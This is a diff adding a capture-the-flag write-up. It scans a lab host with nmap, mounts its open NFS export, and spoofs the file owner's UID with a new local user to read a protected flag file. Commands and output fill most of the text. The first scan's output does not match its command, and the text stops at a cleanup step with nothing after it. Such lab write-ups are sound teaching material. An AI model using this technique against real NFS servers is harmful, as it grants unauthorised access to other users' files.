@@ -1,0 +1,56 @@
+Port scan the given target:
+$ nmap -Pn 192.168.1.2
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-15 18:54 CDT
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds
+
+$ nmap -Pn 192.168.1.2
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-15 18:59 CDT
+Nmap scan report for 192.168.1.2
+Host is up (0.0077s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE
+111/tcp  open  rpcbind
+2049/tcp open  nfs
+
+Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
+
+Oh, what's NFS?
+$ sudo apt-get install nfs-common
+$ showmount -e 192.168.1.2
+Export list for 192.168.1.2:
+/nfs *
+$ sudo mkdir /mnt/flag
+$ sudo mount -o hard,nolock 192.168.1.2:/nfs flag
+$ cd /mnt/flag
+```
+
+Cool, what's here?
+```
+$ find .
+[...]
+./tesiuwu/Pictures/flag.txt
+```
+
+Yes.  Gimme:
+```
+$ cat ./tesiuwu/Pictures/flag.txt
+cat: flag.txt: Permission denied
+```
+
+What?  Why?
+```
+$ ls -aln ./tesiuwu/Pictures/flag.txt
+-r-------- 1 48192 1000   28 Oct 15  2018 flag.txt
+```
+
+Oh.  That's fine:
+```
+$ sudo useradd -u 48192 -M -r totally-tesiuwu
+$ sudo su totally-tesiuwu
+$ cat ./tesiuwu/Pictures/flag.txt
+utflag{cli3nt_s1d3_nfs_b4d}
+```
+
+And now let's clean up:
+```
